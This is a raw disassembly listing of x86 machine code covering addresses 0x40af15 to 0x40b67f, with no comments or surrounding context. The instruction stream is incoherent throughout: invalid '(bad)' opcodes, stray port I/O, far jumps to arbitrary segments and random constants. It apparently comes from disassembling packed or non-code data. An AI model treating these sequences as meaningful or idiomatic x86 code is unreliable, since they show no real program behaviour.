  40af15:	xchg   edx,eax
  40af16:	fld    DWORD PTR [edx]
  40af18:	test   al,0x68
  40af1a:	into   
  40af1b:	fild   QWORD PTR [edx]
  40af1d:	mov    ebx,0xc9c804b6
  40af22:	or     dh,cl
  40af24:	out    dx,al
  40af25:	out    dx,al
  40af26:	repz arpl di,sp
  40af29:	dec    ebx
  40af2a:	(bad)  [edi-0x35]
  40af2d:	(bad)
  40af31:	jge    0x40af38
  40af33:	add    BYTE PTR [esi+0x6e],al
  40af36:	inc    esi
  40af37:	out    dx,eax
  40af38:	rol    dh,1
  40af3a:	outs   dx,BYTE PTR ds:[esi]
  40af3b:	outs   dx,DWORD PTR ds:[esi]
  40af3c:	jl     0x40aefc
  40af3e:	jl     0x40aecc
  40af40:	sub    al,0xf2
  40af42:	cdq    
  40af43:	popa   
  40af44:	push   0x44b12158
  40af49:	test   BYTE PTR [eax+0x71],al
  40af4c:	pop    ebp
  40af4d:	cwde   
  40af4e:	mov    al,0xbf
  40af50:	loopne 0x40aef4
  40af52:	jp     0x40aee5
  40af54:	call   0xea37:0x8e78fca9
  40af5b:	mov    ebx,0x4fd4848f
  40af60:	fdivr  DWORD PTR [edx]
  40af62:	jp     0x40af15
  40af64:	pop    eax
  40af65:	or     edi,ebx
  40af67:	loopne 0x40af55
  40af69:	fst    QWORD PTR [ecx+eax*4+0x73]
  40af6d:	mov    eax,ds:0xef19d11a
  40af72:	js     0x40af68
  40af74:	sub    ebp,DWORD PTR ds:[ecx-0x4769d705]
  40af7b:	mov    ds,WORD PTR [ecx-0x704c054f]
  40af81:	cld    
  40af82:	or     edx,DWORD PTR ds:0xedfb3396
  40af88:	push   es
  40af89:	repnz mov cl,0xb3
  40af8c:	mov    esp,0x44e30c4b
  40af91:	inc    ebp
  40af92:	cli    
  40af93:	icebp  
  40af94:	bndstx [ebx-0x4b],bnd2
  40af98:	loop   0x40b012
  40af9a:	push   0x5
  40af9c:	fimul  WORD PTR [ebp-0x61cdb8ec]
  40afa2:	dec    edx
  40afa3:	int3   
  40afa4:	pusha  
  40afa5:	mov    ebp,0x8d40158c
  40afaa:	mov    esi,0xb57b3aec
  40afaf:	shl    DWORD PTR [edi],cl
  40afb1:	mov    edx,0xcada6d11
  40afb6:	jg     0x40af73
  40afb8:	leave  
  40afb9:	inc    edx
  40afba:	fdiv   DWORD PTR [edi+0xd3a749c]
  40afc0:	pushf  
  40afc1:	(bad)  
  40afc2:	ins    DWORD PTR es:[edi],dx
  40afc3:	push   ebp
  40afc5:	ins    BYTE PTR es:[edi],dx
  40afc6:	les    ebp,FWORD PTR [ebp-0x50]
  40afc9:	sahf   
  40afca:	ja     0x40afa6
  40afcc:	push   ebx
  40afcd:	or     al,0x60
  40afcf:	cmp    al,0x4
  40afd1:	rcl    BYTE PTR [eax+edi*8-0x2d3ec46],cl
  40afd8:	xchg   esp,eax
  40afd9:	cdq    
  40afda:	pushf  
  40afdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afdc:	adc    esp,DWORD PTR [ecx+0x10d5afd8]
  40afe2:	mov    bl,0x41
  40afe4:	cwde   
  40afe5:	xchg   ecx,eax
  40afe6:	pop    eax
  40afe7:	lods   al,BYTE PTR ds:[esi]
  40afe8:	xor    eax,DWORD PTR [ebp+0x53]
  40afeb:	jnp    0x40afdb
  40afed:	leave  
  40afee:	or     ecx,DWORD PTR [edx-0x66]
  40aff1:	outs   dx,BYTE PTR ds:[esi]
  40aff2:	stos   BYTE PTR es:[edi],al
  40aff3:	(bad)  
  40aff4:	or     BYTE PTR [ebp-0x337eb5ae],dh
  40affa:	lods   al,BYTE PTR ds:[esi]
  40affb:	xchg   edx,eax
  40affc:	lds    eax,FWORD PTR [esi]
  40affe:	mov    DWORD PTR [esi+0x187b33da],edi
  40b004:	mov    ebx,0xc4c41235
  40b009:	add    eax,0x21f41af0
  40b00e:	or     edi,DWORD PTR [ebx]
  40b010:	lods   eax,DWORD PTR ds:[esi]
  40b011:	jbe    0x40b009
  40b013:	jmp    0x40b026
  40b015:	es pop esp
  40b017:	xchg   ebp,eax
  40b018:	dec    esi
  40b019:	retf   
  40b01a:	addr16 xchg ebp,eax
  40b01c:	addr16 aad 0xfa
  40b01f:	test   DWORD PTR [ebx],eax
  40b021:	mov    esi,0x84d37d00
  40b026:	and    eax,0xc4355cf8
  40b02b:	loop   0x40b060
  40b02d:	and    BYTE PTR [ebx+0x5002d672],cl
  40b033:	jp     0x40b051
  40b035:	fmul   QWORD PTR [edx]
  40b037:	aas    
  40b038:	mov    DWORD PTR [ebp+esi*8-0x38c81587],esi
  40b03f:	stos   DWORD PTR es:[edi],eax
  40b040:	aas    
  40b041:	loopne 0x40b071
  40b043:	mov    edx,0x99519cb4
  40b048:	lds    eax,FWORD PTR [eax+0x3]
  40b04b:	pop    ecx
  40b04c:	ins    BYTE PTR es:[edi],dx
  40b04d:	sub    esi,DWORD PTR [edx+0x1a11ef7d]
  40b053:	shl    DWORD PTR [edi-0x35f03c4],cl
  40b059:	les    ebp,FWORD PTR [edi]
  40b05b:	mov    ?,WORD PTR [ecx+0x3]
  40b05e:	adc    BYTE PTR [ebp-0x19],al
  40b061:	mov    WORD PTR [eax-0x8],?
  40b064:	into   
  40b065:	repz (bad) 
  40b067:	mov    ds:0x148d94b,eax
  40b06c:	cmp    al,0x6e
  40b06e:	cmp    eax,0x2b719c4c
  40b073:	out    dx,eax
  40b074:	not    ebp
  40b076:	xchg   ebp,eax
  40b077:	cs jno 0x40b018
  40b07a:	test   al,0x1f
  40b07c:	pop    esi
  40b07d:	ror    BYTE PTR [edi+0x46c5569a],cl
  40b083:	(bad)  
  40b084:	dec    ebx
  40b085:	and    ebp,DWORD PTR [ebp-0x54]
  40b088:	lods   al,BYTE PTR ds:[esi]
  40b089:	inc    ecx
  40b08a:	inc    ecx
  40b08b:	xchg   esp,eax
  40b08c:	sar    edx,cl
  40b08e:	or     ch,0x5
  40b091:	in     eax,0x2b
  40b093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b094:	popa   
  40b095:	xor    BYTE PTR [ebp+0x62831e43],cl
  40b09b:	pop    esp
  40b09c:	add    al,0x56
  40b09e:	xor    DWORD PTR [ebx+0x76],0xffffffc1
  40b0a2:	dec    esp
  40b0a3:	pop    ebp
  40b0a4:	(bad)  
  40b0a5:	mov    ds:0x980fa044,eax
  40b0aa:	mov    ecx,0x7d568872
  40b0af:	or     DWORD PTR [edx-0x6],esp
  40b0b2:	push   ds
  40b0b3:	push   0xb48f70fb
  40b0b8:	int3   
  40b0b9:	pushf  
  40b0ba:	mov    esp,0xa0ba94b0
  40b0bf:	push   ecx
  40b0c0:	inc    edx
  40b0c1:	in     al,dx
  40b0c2:	ficom  WORD PTR [ebp+0x525df367]
  40b0c8:	cli    
  40b0c9:	and    eax,0x7db4cfda
  40b0ce:	cld    
  40b0cf:	cmp    DWORD PTR [edi+0x30],ebx
  40b0d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0d3:	and    al,0x92
  40b0d5:	cmp    bl,BYTE PTR [edi+0xee9611]
  40b0db:	xchg   ecx,eax
  40b0dc:	push   ss
  40b0dd:	adc    al,0x59
  40b0df:	push   ecx
  40b0e0:	jb     0x40b0d0
  40b0e2:	dec    ecx
  40b0e3:	jmp    0x40b093
  40b0e5:	mov    fs,ebp
  40b0e7:	ins    BYTE PTR es:[edi],dx
  40b0e8:	in     eax,0xf2
  40b0ea:	fidiv  DWORD PTR [esi-0x60b4c280]
  40b0f0:	ds popf 
  40b0f2:	js     0x40b0d4
  40b0f4:	dec    esp
  40b0f5:	cli    
  40b0f6:	in     al,0x8a
  40b0f8:	sar    DWORD PTR [edx+0x71100d0],1
  40b0fe:	adc    ecx,edx
  40b100:	sbb    al,dl
  40b102:	and    ecx,DWORD PTR [edi]
  40b104:	adc    al,0x49
  40b106:	mov    edx,edx
  40b108:	loop   0x40b0e0
  40b10a:	xchg   ebx,eax
  40b10b:	mov    ds:0xd6d80876,al
  40b110:	mov    eax,0x1ff08312
  40b115:	and    bp,WORD PTR [ecx+0x2ad37a86]
  40b11c:	mov    ecx,eax
  40b11e:	in     al,0xb6
  40b120:	sub    DWORD PTR [esi+0x59],edx
  40b123:	in     al,0xc4
  40b125:	push   ss
  40b126:	xchg   ebx,eax
  40b127:	xchg   BYTE PTR [esi-0x76ad223a],dl
  40b12d:	dec    edi
  40b12e:	cmp    eax,0xf97f5c8a
  40b133:	sbb    bl,BYTE PTR [esi-0x21269a29]
  40b139:	(bad)  
  40b13b:	out    0x62,eax
  40b13d:	mov    fs,esp
  40b13f:	fisub  WORD PTR [eax-0x9e00744]
  40b145:	sbb    DWORD PTR [edx],edi
  40b147:	jno    0x40b0e2
  40b149:	ins    BYTE PTR es:[edi],dx
  40b14a:	fistp  WORD PTR [ebx+0x56]
  40b14d:	outs   dx,BYTE PTR ds:[esi]
  40b14e:	test   al,0xa5
  40b150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b151:	push   ebp
  40b152:	mov    ah,0x70
  40b154:	add    eax,0x9e98d98e
  40b159:	scas   eax,DWORD PTR es:[edi]
  40b15a:	cmp    eax,edx
  40b15c:	sub    ch,0xb7
  40b15f:	dec    ecx
  40b160:	jb     0x40b199
  40b162:	popf   
  40b163:	dec    eax
  40b164:	aas    
  40b165:	jecxz  0x40b0ea
  40b167:	dec    ebp
  40b168:	mov    ebx,0x59372160
  40b16d:	lods   al,BYTE PTR ds:[esi]
  40b16e:	std    
  40b16f:	adc    DWORD PTR [eax-0x51],ecx
  40b172:	push   ds
  40b173:	push   esi
  40b174:	mul    BYTE PTR [eax+0x71]
  40b177:	mov    ebp,0x955722a1
  40b17c:	jmp    0x40b18b
  40b17e:	stos   DWORD PTR es:[edi],eax
  40b17f:	sbb    ecx,ebx
  40b181:	pop    ds
  40b182:	inc    esi
  40b183:	push   ebx
  40b184:	cs inc eax
  40b186:	iret   
  40b187:	jno    0x40b1c4
  40b189:	mov    bl,0x2c
  40b18b:	mov    al,ds:0xd7426107
  40b190:	in     al,dx
  40b191:	or     al,0xce
  40b193:	mov    ebp,0x10a3977e
  40b198:	popa   
  40b199:	and    al,0x51
  40b19b:	out    0xe3,al
  40b19d:	mov    eax,ds:0x242b9b59
  40b1a2:	(bad)  
  40b1a4:	scas   al,BYTE PTR es:[edi]
  40b1a5:	xchg   ecx,eax
  40b1a6:	imul   esi,DWORD PTR [ebx+0x110e1f38],0x41ddb15
  40b1b0:	mov    ecx,0x4a2c6979
  40b1b5:	dec    ecx
  40b1b6:	sbb    al,0xd1
  40b1b8:	mov    bl,0xcd
  40b1ba:	xchg   edx,eax
  40b1bb:	(bad)  
  40b1bd:	sbb    al,0x26
  40b1bf:	mov    ebp,0x6484b1a0
  40b1c4:	mov    ebp,0xf97f1c3a
  40b1c9:	pop    ss
  40b1ca:	xlat   BYTE PTR ds:[ebx]
  40b1cb:	es dec BYTE PTR ss:[esi+0x4204f35d]
  40b1d3:	fimul  WORD PTR [edi]
  40b1d5:	dec    ebp
  40b1d6:	push   0x926d51e9
  40b1db:	cmp    eax,0xce457b39
  40b1e0:	adc    eax,0xb4289a67
  40b1e5:	or     esi,ebp
  40b1e7:	out    dx,al
  40b1e8:	add    al,0x6f
  40b1ea:	cmp    dh,cl
  40b1ec:	rcr    DWORD PTR [ecx+0x5e],0x27
  40b1f0:	into   
  40b1f1:	or     edi,DWORD PTR [ebp+0x7cacb7f5]
  40b1f7:	popa   
  40b1f8:	enter  0xbb63,0x52
  40b1fc:	pusha  
  40b1fd:	retf   
  40b1fe:	or     al,0xf1
  40b200:	mov    bh,ah
  40b202:	ficom  WORD PTR [ecx]
  40b204:	int    0xa2
  40b206:	mov    dl,0x83
  40b208:	fwait
  40b209:	sub    BYTE PTR [ebp-0x33],cl
  40b20c:	mov    al,0x7
  40b20e:	lea    ebx,[ecx+0x2a83876f]
  40b214:	test   eax,0xd30e74bc
  40b219:	xchg   esi,eax
  40b21a:	fcmovnbe st,st(2)
  40b21c:	enter  0x6248,0xef
  40b220:	sahf   
  40b221:	and    DWORD PTR [edi],edx
  40b223:	add    eax,edx
  40b225:	cld    
  40b226:	xlat   BYTE PTR ds:[ebx]
  40b227:	ins    BYTE PTR es:[edi],dx
  40b228:	fistp  DWORD PTR [esi+0x3ed2fb98]
  40b22e:	(bad)  
  40b22f:	fisubr WORD PTR [esi-0x3856a816]
  40b235:	rcr    BYTE PTR cs:[edx],1
  40b238:	jb     0x40b228
  40b23a:	in     al,dx
  40b23b:	stc    
  40b23c:	xchg   esp,eax
  40b23d:	push   ds
  40b23e:	pop    esp
  40b23f:	loope  0x40b1d0
  40b241:	scas   al,BYTE PTR es:[edi]
  40b242:	rol    dh,0x58
  40b245:	mov    dh,0x88
  40b247:	iret   
  40b248:	addr16 add eax,0x417f6c1c
  40b24e:	leave  
  40b24f:	xchg   ebp,eax
  40b250:	popa   
  40b251:	xor    ch,BYTE PTR [edx-0x5a]
  40b254:	mov    ds,WORD PTR [ebx]
  40b256:	xor    edi,DWORD PTR [ebp+0x76520670]
  40b25c:	dec    ebx
  40b25d:	jo     0x40b297
  40b25f:	sub    DWORD PTR [ebx-0x1b],ebx
  40b262:	shl    ah,1
  40b264:	in     al,dx
  40b265:	jns    0x40b2a8
  40b267:	pop    eax
  40b268:	push   ds
  40b269:	and    bl,cl
  40b26b:	xchg   esp,eax
  40b26c:	push   edx
  40b26d:	ins    BYTE PTR es:[edi],dx
  40b26e:	inc    edi
  40b26f:	(bad)  
  40b271:	dec    eax
  40b272:	push   eax
  40b273:	dec    esi
  40b274:	int    0x56
  40b276:	int    0x7d
  40b278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b279:	jp     0x40b260
  40b27b:	gs push esp
  40b27d:	shl    DWORD PTR [ecx-0x7d],0xfd
  40b281:	mov    ebp,0x162dd16f
  40b286:	jl     0x40b2b2
  40b288:	inc    esi
  40b289:	into   
  40b28a:	imul   edx
  40b28c:	leave  
  40b28d:	sti    
  40b28e:	jae    0x40b286
  40b290:	sbb    ebp,DWORD PTR [ebx+0x502f5356]
  40b296:	das    
  40b297:	test   ah,0x4a
  40b29a:	outs   dx,DWORD PTR ds:[esi]
  40b29b:	dec    edx
  40b29c:	je     0x40b278
  40b29e:	add    al,0xc1
  40b2a0:	jmp    0x2b336bce
  40b2a5:	icebp  
  40b2a6:	inc    ebp
  40b2a7:	jmp    0x5937:0xf4a1b4b1
  40b2ae:	mov    bl,0x21
  40b2b0:	enter  0x5b37,0xea
  40b2b4:	cwde   
  40b2b5:	in     al,dx
  40b2b6:	push   cs
  40b2b7:	pop    ds
  40b2b8:	imul   ebx,edx,0x32
  40b2bb:	push   ss
  40b2bc:	add    ah,BYTE PTR [ebx]
  40b2be:	jne    0x40b2c3
  40b2c0:	pushf  
  40b2c1:	repnz iret 
  40b2c3:	nop
  40b2c4:	test   DWORD PTR [ebx-0x64],edx
  40b2c7:	jo     0x40b284
  40b2c9:	inc    esp
  40b2ca:	mov    ebx,0x83a5f9cc
  40b2cf:	data16 and dl,BYTE PTR [eax]
  40b2d2:	jecxz  0x40b2d3
  40b2d4:	mov    edi,0xe4c1f219
  40b2d9:	fstp   DWORD PTR [edx]
  40b2db:	out    dx,al
  40b2dc:	clc    
  40b2dd:	mov    cl,0x5b
  40b2df:	adc    ebx,ecx
  40b2e1:	outs   dx,DWORD PTR ds:[esi]
  40b2e2:	and    eax,0xc07be99e
  40b2e7:	test   DWORD PTR [ebp+0x48b08464],edi
  40b2ed:	mov    bl,BYTE PTR [ebp-0x559db95]
  40b2f3:	add    al,ch
  40b2f5:	adc    al,0xf5
  40b2f7:	cld    
  40b2f8:	mov    edi,0x75822c8f
  40b2fd:	pushf  
  40b2fe:	icebp  
  40b2ff:	xor    BYTE PTR [esp+edi*1+0x4a],bh
  40b303:	xor    ah,BYTE PTR [ebx-0x78]
  40b306:	sbb    al,0xbc
  40b308:	dec    edi
  40b309:	loope  0x40b354
  40b30b:	pop    ecx
  40b30c:	mov    DWORD PTR [ebp-0x89aeeeb],ebp
  40b312:	xchg   esi,eax
  40b313:	bswap  eax
  40b315:	sbb    eax,0x5e8a3bd3
  40b31a:	mov    ds:0xb7c49ce2,eax
  40b31f:	test   DWORD PTR [ebp+0x6a],eax
  40b322:	cmp    al,0x16
  40b324:	mov    cl,0xcd
  40b326:	lahf   
  40b327:	add    BYTE PTR [edi+0x30],dh
  40b32a:	test   al,0xf8
  40b32c:	bound  esp,QWORD PTR [edx]
  40b32e:	add    DWORD PTR [ebx+0x23],esi
  40b331:	xchg   ecx,eax
  40b332:	jns    0x40b31e
  40b334:	data16 adc BYTE PTR [esi-0x30],0xf8
  40b339:	jbe    0x40b2f7
  40b33b:	jmp    0x29fd:0x903c3177
  40b342:	jnp    0x40b386
  40b344:	jle    0x40b352
  40b346:	or     edi,edx
  40b348:	mov    ch,0x95
  40b34a:	and    BYTE PTR cs:[ebp+0x5fe90f0e],ch
  40b351:	(bad)  
  40b353:	sbb    BYTE PTR [ebx-0x3b],0x6a
  40b357:	cmp    al,0x31
  40b359:	add    dh,BYTE PTR [esi]
  40b35b:	add    eax,0x12e1174f
  40b360:	push   es
  40b361:	outs   dx,DWORD PTR ds:[esi]
  40b362:	inc    eax
  40b363:	and    al,0xaa
  40b365:	add    edx,0x18
  40b368:	push   0xfffffffa
  40b36a:	adc    ah,BYTE PTR [edx+0x6b8ab910]
  40b370:	inc    ebp
  40b371:	xchg   ebx,eax
  40b372:	sbb    BYTE PTR [edi+0x26],cl
  40b375:	or     ch,ch
  40b377:	xor    eax,0x416d91e
  40b37c:	cwde   
  40b37d:	nop
  40b37e:	out    dx,eax
  40b37f:	inc    esi
  40b380:	jmp    0x40b34b
  40b382:	xchg   DWORD PTR [edx+0x69],eax
  40b385:	sub    eax,0xf9abde31
  40b38a:	cs loope 0x40b310
  40b38d:	jl     0x40b39c
  40b38f:	popf   
  40b390:	jmp    FWORD PTR ds:0xfc969a2a
  40b396:	and    ebx,DWORD PTR [edi]
  40b398:	imul   edi,DWORD PTR [ebp-0xa],0x74314429
  40b39f:	imul   edi,DWORD PTR [edi-0x296631b0],0x5b
  40b3a6:	cmc    
  40b3a7:	xchg   esp,eax
  40b3a8:	jne    0x40b404
  40b3aa:	push   0xffffffd2
  40b3ac:	add    DWORD PTR [ecx-0x4f],0x19804790
  40b3b3:	gs add eax,0x7e70e233
  40b3b9:	and    al,0xa1
  40b3bb:	push   ds
  40b3bc:	dec    esi
  40b3bd:	mov    ss,WORD PTR [esi-0x5]
  40b3c0:	pop    DWORD PTR [ebx+0x71fa91b4]
  40b3c6:	sbb    ecx,DWORD PTR [edi-0x25]
  40b3c9:	sub    bh,BYTE PTR [ecx-0x6c2c6acb]
  40b3cf:	mov    dh,0x78
  40b3d1:	imul   ebx,ebx,0x79d16af1
  40b3d7:	mov    ds:0xcfe9d4de,eax
  40b3dc:	and    DWORD PTR [ecx+0x365edd24],ebx
  40b3e2:	push   ss
  40b3e3:	out    0x24,eax
  40b3e5:	imul   ecx,DWORD PTR [ebx+0x3a7f6cb8],0x1d
  40b3ec:	loop   0x40b3f2
  40b3ee:	ret    0xe5c5
  40b3f1:	cmp    ebx,edx
  40b3f3:	jmp    0x8ebd7e2b
  40b3f8:	sub    cl,bh
  40b3fa:	xlat   BYTE PTR ds:[ebx]
  40b3fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3fc:	mov    DWORD PTR [eax+ecx*2],esp
  40b3ff:	xchg   ebx,eax
  40b400:	cs or  eax,0x4a639f7c
  40b406:	lahf   
  40b407:	jmp    DWORD PTR [ebx]
  40b409:	ret    0x808c
  40b40c:	into   
  40b40d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b40e:	sbb    ebp,0x76
  40b411:	jp     0x40b44d
  40b413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b414:	jno    0x40b3d0
  40b416:	sub    BYTE PTR [ebx+0x3f42e31],0xd
  40b41d:	or     BYTE PTR [ebx-0x36],0xd6
  40b421:	cwde   
  40b422:	inc    esp
  40b423:	sar    DWORD PTR ds:0x7f584219,1
  40b429:	or     ah,BYTE PTR [edi]
  40b42b:	adc    al,0x4c
  40b42d:	xor    ecx,ecx
  40b42f:	push   esi
  40b430:	xor    eax,0x415b127c
  40b435:	(bad)  
  40b436:	ss test eax,0x165125a1
  40b43c:	xor    BYTE PTR [ebp+0x384d6f3e],bl
  40b442:	jb     0x40b4ad
  40b444:	(bad)  
  40b445:	les    edx,FWORD PTR [edi]
  40b447:	mov    ecx,0x82c90e8
  40b44c:	mov    esp,0x95b87355
  40b451:	push   esp
  40b452:	mov    dh,0xef
  40b454:	push   edx
  40b455:	jne    0x40b40f
  40b457:	mov    al,ds:0x36978342
  40b45c:	xor    DWORD PTR [eax],esi
  40b45e:	loopne 0x40b4a8
  40b460:	adc    esp,0x21b441a7
  40b466:	in     eax,0x5a
  40b468:	arpl   WORD PTR [ebx+edx*2-0x2c],cx
  40b46c:	scas   al,BYTE PTR es:[edi]
  40b46d:	or     esp,edi
  40b46f:	add    DWORD PTR [ebx+0xcb3c771],edi
  40b475:	sub    ah,BYTE PTR [ebx+0x457562bd]
  40b47b:	sti    
  40b47c:	cdq    
  40b47d:	jecxz  0x40b4b8
  40b47f:	rcl    DWORD PTR [edx-0x17],cl
  40b482:	and    ecx,DWORD PTR [esi-0x5610c9ac]
  40b488:	leave  
  40b489:	icebp  
  40b48a:	jl     0x40b414
  40b48c:	inc    esp
  40b48d:	or     DWORD PTR [ecx],0xe3a53b4f
  40b493:	lods   eax,DWORD PTR ds:[esi]
  40b494:	xchg   edi,eax
  40b495:	mov    BYTE PTR [esi-0x20599fd5],bh
  40b49b:	mov    ds:0x444c3c1e,eax
  40b4a0:	test   dh,al
  40b4a2:	addr16 (bad) 
  40b4a4:	sbb    dh,BYTE PTR [ebx-0x31]
  40b4a7:	push   edi
  40b4a8:	inc    esp
  40b4a9:	sub    DWORD PTR [eax-0x7468776b],esp
  40b4af:	rcr    edx,cl
  40b4b1:	out    dx,al
  40b4b2:	jmp    0xadd0:0x6aa6cc24
  40b4b9:	xor    DWORD PTR [ebx],eax
  40b4bb:	lods   eax,DWORD PTR ds:[esi]
  40b4bc:	adc    eax,DWORD PTR [ebp-0x78927abc]
  40b4c2:	inc    ecx
  40b4c3:	mov    al,gs:0xd043778f
  40b4c9:	js     0x40b53b
  40b4cb:	and    eax,0x5ee273fe
  40b4d0:	aad    0x2b
  40b4d2:	arpl   bp,cx
  40b4d4:	push   0xe48b2fff
  40b4d9:	inc    ebx
  40b4da:	repnz lods eax,DWORD PTR ds:[esi]
  40b4dc:	mov    edi,DWORD PTR [edi+0x50]
  40b4df:	inc    esi
  40b4e0:	je     0x40b4b8
  40b4e2:	or     BYTE PTR [eax],ah
  40b4e4:	pop    edx
  40b4e5:	xchg   ebx,eax
  40b4e6:	stc    
  40b4e7:	inc    ecx
  40b4e8:	mov    dl,0x5
  40b4ea:	(bad)  
  40b4eb:	int3   
  40b4ec:	mov    edx,0x1ac59867
  40b4f1:	cmc    
  40b4f2:	in     eax,0xf3
  40b4f4:	and    al,0x11
  40b4f6:	inc    edi
  40b4f7:	mov    bh,0x43
  40b4f9:	push   ebx
  40b4fa:	xor    BYTE PTR [ecx],ah
  40b4fc:	dec    edx
  40b4fd:	push   ebp
  40b4fe:	loope  0x40b4e6
  40b500:	(bad)  
  40b501:	hlt    
  40b502:	sbb    eax,0x3d79479b
  40b508:	dec    esp
  40b509:	or     eax,0xa07650f
  40b50e:	repz fidiv DWORD PTR [ebp+0x6f]
  40b512:	jmp    0x40b49d
  40b514:	inc    ebx
  40b515:	dec    eax
  40b516:	inc    esp
  40b517:	adc    edi,DWORD PTR [eax+0x28]
  40b51a:	add    BYTE PTR [esi],0x66
  40b51d:	and    BYTE PTR [edx],0xb
  40b520:	out    0xd,al
  40b522:	sbb    DWORD PTR [edx+0x19f976a3],0xffffffcc
  40b529:	cmp    ebp,DWORD PTR [edx+0x65]
  40b52c:	clc    
  40b52d:	pop    edx
  40b52e:	pop    edi
  40b52f:	leave  
  40b530:	cdq    
  40b531:	out    0xfb,eax
  40b533:	(bad)  
  40b534:	jge    0x40b4eb
  40b536:	dec    ecx
  40b537:	sbb    BYTE PTR [edi],0xd2
  40b53a:	inc    eax
  40b53b:	push   edi
  40b53c:	nop
  40b53d:	loop   0x40b53e
  40b53f:	mov    bh,0xfd
  40b541:	loopne 0x40b578
  40b543:	mov    BYTE PTR [ebx+0x71],0xff
  40b547:	sahf   
  40b548:	dec    esi
  40b54a:	cmp    dl,BYTE PTR [ecx+esi*1+0x377df321]
  40b551:	adc    esp,esi
  40b553:	cmp    eax,DWORD PTR [esi-0x43f0575f]
  40b559:	lods   eax,DWORD PTR ds:[esi]
  40b55a:	ror    BYTE PTR [ebp+0x43],0x9
  40b55e:	scas   eax,DWORD PTR es:[edi]
  40b55f:	shr    edx,1
  40b561:	adc    bh,bh
  40b563:	popa   
  40b564:	les    edi,FWORD PTR ds:0x402748
  40b56a:	nop
  40b56b:	sti    
  40b56c:	pop    ss
  40b56d:	scas   eax,DWORD PTR es:[edi]
  40b56e:	sub    DWORD PTR [ebp-0x10d4d2d7],ebp
  40b574:	js     0x40b52a
  40b576:	inc    eax
  40b577:	mov    ebx,0x4157949e
  40b57c:	cmc    
  40b57d:	push   eax
  40b57e:	ja     0x40b56d
  40b580:	ds inc ebp
  40b582:	mov    ds:0x53f94c4b,eax
  40b587:	pusha  
  40b588:	fucomp st(6)
  40b58a:	dec    esi
  40b58b:	cmp    ebx,DWORD PTR [ebp+eiz*4-0x3d]
  40b58f:	pop    eax
  40b590:	sar    esi,cl
  40b592:	pusha  
  40b593:	out    0xbc,eax
  40b595:	in     al,dx
  40b596:	(bad)  
  40b598:	pop    es
  40b599:	xor    al,0x47
  40b59b:	push   esi
  40b59c:	out    0x75,eax
  40b59e:	mov    edx,0xfb817406
  40b5a3:	std    
  40b5a4:	imul   ebx,DWORD PTR ds:0x592512f4,0xffffff93
  40b5ab:	out    dx,al
  40b5ac:	(bad)
  40b5af:	cdq    
  40b5b0:	pop    esp
  40b5b1:	xchg   edx,eax
  40b5b2:	inc    ecx
  40b5b3:	repnz sar BYTE PTR [ebx-0x57],cl
  40b5b7:	sub    al,0x6f
  40b5b9:	dec    ecx
  40b5ba:	mov    esi,0xcd9f27e1
  40b5bf:	lods   al,BYTE PTR ds:[esi]
  40b5c0:	xchg   si,ax
  40b5c2:	aad    0x49
  40b5c4:	add    ah,bl
  40b5c6:	push   0xffffff85
  40b5c8:	cmp    DWORD PTR [edi-0x35],esi
  40b5cb:	push   es
  40b5cc:	iret   
  40b5cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5ce:	les    edx,FWORD PTR [edx+edx*1-0x3a]
  40b5d2:	and    al,0xd9
  40b5d4:	jns    0x40b609
  40b5d6:	xchg   ecx,eax
  40b5d7:	nop
  40b5d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5d9:	mov    ah,0xe5
  40b5db:	sbb    ebx,esi
  40b5dd:	aad    0x18
  40b5df:	push   ecx
  40b5e0:	out    0x25,eax
  40b5e2:	and    DWORD PTR ds:0x2b4a9404,eax
  40b5e8:	jmp    0x94bc:0xed7e6efa
  40b5ef:	add    al,0x62
  40b5f1:	mov    edx,0xc7a575dd
  40b5f6:	push   0xca5eb67
  40b5fb:	into   
  40b5fc:	jmp    0x40b605
  40b5fe:	out    0x83,eax
  40b600:	lods   eax,DWORD PTR ds:[esi]
  40b601:	sub    ebp,esp
  40b603:	sti    
  40b604:	jl     0x40b5dc
  40b606:	rcl    bl,cl
  40b608:	in     al,dx
  40b609:	call   0xa502f890
  40b60e:	add    edi,esp
  40b610:	cmp    BYTE PTR [bx+di],bl
  40b613:	adc    eax,ebx
  40b615:	ret    0x83c6
  40b618:	pop    eax
  40b619:	mov    ebx,0x37f2cb23
  40b61e:	mov    esp,0x197ec9f4
  40b623:	pop    ss
  40b624:	sahf   
  40b625:	scas   al,BYTE PTR es:[edi]
  40b626:	sub    dl,BYTE PTR gs:[edx-0x2a]
  40b62a:	inc    ecx
  40b62b:	jl     0x40b5b6
  40b62d:	jbe    0x40b63a
  40b62f:	add    bl,BYTE PTR [ebx-0x43]
  40b632:	or     eax,0xd914069d
  40b637:	sub    DWORD PTR [esi],ebp
  40b639:	aaa    
  40b63a:	ins    DWORD PTR es:[edi],dx
  40b63b:	cmp    DWORD PTR [edi-0x52],eax
  40b63e:	cwde   
  40b63f:	stos   DWORD PTR es:[edi],eax
  40b640:	in     eax,0xc5
  40b642:	push   ebp
  40b643:	push   ds
  40b644:	dec    ebp
  40b645:	bswap  edx
  40b647:	add    DWORD PTR [ebp-0x2d],edx
  40b64a:	cmp    dh,BYTE PTR [eax-0x44ce05a2]
  40b650:	pop    ecx
  40b651:	enter  0xd781,0xb
  40b655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b656:	cmp    DWORD PTR ds:0xb34e09f,eax
  40b65c:	sub    ebp,esi
  40b65e:	push   ecx
  40b65f:	push   edi
  40b660:	fisubr WORD PTR [ecx-0x1]
  40b663:	cmp    al,0xf2
  40b665:	imul   ecx,DWORD PTR ds:[ebx-0x4d4a973f],0x39
  40b66d:	stc    
  40b66e:	mov    cl,0x9
  40b670:	(bad)  
  40b671:	retf   0xbd54
  40b674:	mov    bh,0xfc
  40b676:	xchg   DWORD PTR [edi+0x42703f51],ebx
  40b67c:	xor    BYTE PTR [edx],ah
  40b67e:	lahf   
  40b67f:	mov    ebx,0x78406873
